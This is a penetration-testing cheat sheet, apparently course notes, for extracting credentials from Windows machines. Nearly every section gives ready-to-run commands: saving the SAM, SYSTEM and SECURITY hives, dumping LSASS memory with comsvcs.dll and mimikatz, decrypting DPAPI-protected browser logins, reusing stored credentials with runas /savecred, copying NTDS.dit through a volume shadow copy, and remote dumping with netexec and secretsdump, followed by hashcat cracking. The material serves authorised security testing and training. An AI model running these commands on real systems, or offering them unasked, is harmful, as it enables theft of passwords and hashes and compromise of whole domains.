# Extracting Password from Windows Systems

## SAM, SYSTEM, and SECURITY

With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline.

Registry hives

| Registry Hive    | Description                                                                                                                                 |
|------------------|---------------------------------------------------------------------------------------------------------------------------------------------|
| HKLM\SAM         | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                |
| HKLM\SYSTEM      | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                        |
| HKLM\SECURITY    | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

If we're only interested in dumping the hashes of local users, we need only HKLM\SAM and HKLM\SYSTEM

**Using reg.exe to copy registry hives**
````
> reg.exe save hklm\sam C:\sam.save
> reg.exe save hklm\system C:\system.save
> reg.exe save hklm\security C:\security.save
````
**File Directory**
````
> C:\Windows\System32\config\SAM
> C:\Windows\System32\config\SECURITY
> C:\Windows\System32\config\SYSTEM
````
Copy to local machine
````
$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

Dumping local SAM hashes (uid:rid:lmhash:nthash)

$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
````

**Dump Sam Remote**
````
$ netexec smb <IP> --local-auth -u <user> -p <password> --sam
````

**DPAPI**
In addition to the DCC2 hashes, we previously saw that the machine and user keys for DPAPI were also dumped from hklm\security. The Data Protection Application Programming Interface, or DPAPI, is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis.

| Applications              | Use of DPAPI                                                                                   |
|---------------------------|-----------------------------------------------------------------------------------------------|
| Internet Explorer         | Password form auto-completion data (username and password for saved sites).                  |
| Google Chrome             | Password form auto-completion data (username and password for saved sites).                  |
| Outlook                   | Passwords for email accounts.                                                                 |
| Remote Desktop Connection | Saved credentials for connections to remote machines.                                        |
| Credential Manager        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.  |

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz, or remotely with DonPAPI.
````
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
````
Dump lsa & dpapi Remote
````
$ netexec smb <IP> --local-auth -u <user> -p <password> --lsa
$ netexec smb <IP> -u <user> -p <password> --dpapi
$ netexec smb <IP> -u <user> -p <password> --dpapi cookies
$ netexec smb <IP> -u <user> -p <password> --dpapi nosystem
$ netexec smb <IP> -u <user> -p <password> --local-auth --dpapi nosystem
````

## LSASS

We will also benefit from targeting the Local Security Authority Subsystem Service (LSASS). As covered in the Credential Storage section of this module, LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

### Dumping LSASS process memory

**Task Manager method**
- Open Task Manager
- Select the Processes tab
- Find and right click the Local Security Authority Process
- Select Create dump file

A file called lsass.DMP is created and saved in %temp%. `cp <path_lsass.dmp> <directory_wanted>`

**Rundll32.exe & Comsvcs.dll method**
````
> tasklist /svc (Find PID Lsass from cmd)
> Get-Process lsass (Find PID Lsass from powershell)
> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
````

After extracting the process, we will copy it to our machine.

**Pypykatz to extract credentials**
````
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
````

**Mimikatz**
````
# privilege::debug
# sekurlsa::logonpasswords
# sekurlsa::logonPasswords full
# sekurlsa::credman
````

**Dump Remote**
````
$ nxc smb <IP> -u <user> -p '<password>' -M lsassy

````

## Windows Credential Manager

Credential Manager is a feature built into Windows since Server 2008 R2 and Windows 7. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites.

- %UserProfile%\AppData\Local\Microsoft\Vault\
- %UserProfile%\AppData\Local\Microsoft\Credentials\
- %UserProfile%\AppData\Roaming\Microsoft\Vault\
- %ProgramData%\Microsoft\Vault\
- %SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\

Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials.

| Name               | Description                                                                                                                             |
|--------------------|-----------------------------------------------------------------------------------------------------------------------------------------|
| Web Credentials     | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge. |
| Windows Credentials | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |

**Enumerating credentials with cmdkey**
````
>cmdkey /list
Currently stored credentials:
    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
````
Stored credentials are listed with the following format:

| Key         | Value                                                                                                                                             |
|-------------|---------------------------------------------------------------------------------------------------------------------------------------------------|
| Target      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                              |
| Type        | The kind of credential. Common types are Generic for general credentials, and Domain Password for domain user logons.                            |
| User        | The user account associated with the credential.                                                                                                  |
| Persistence | Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with Local machine persistence survive reboots. |

We can use runas to impersonate the stored user like so:
````
>runas /savecred /user:SRV01\mcharles cmd
````

## Active Directory and NTDS.dit

**Creating shadow copy of C:**
````
C:\> vssadmin CREATE SHADOW /For=C:
C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
````

**Copy NTDS.dit file**
````
> copy %SystemRoot%\NTDS\Ntds.dit <directory_to_copy>
````

**Extract Hashes**
````
$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
````

**Extract Remote**
````
$ netexec smb <IP> -u <user> -p <password> -M ntdsutil
$ nxc smb <IP> -u <user> -p '<password>' --ntds
$ nxc smb <IP> -u <user> -p '<password>' --ntds --user Administrator (Dump a specific user only)
$ impacket-secretsdump <domain>/<user>:<password>@<ip_dc>
````
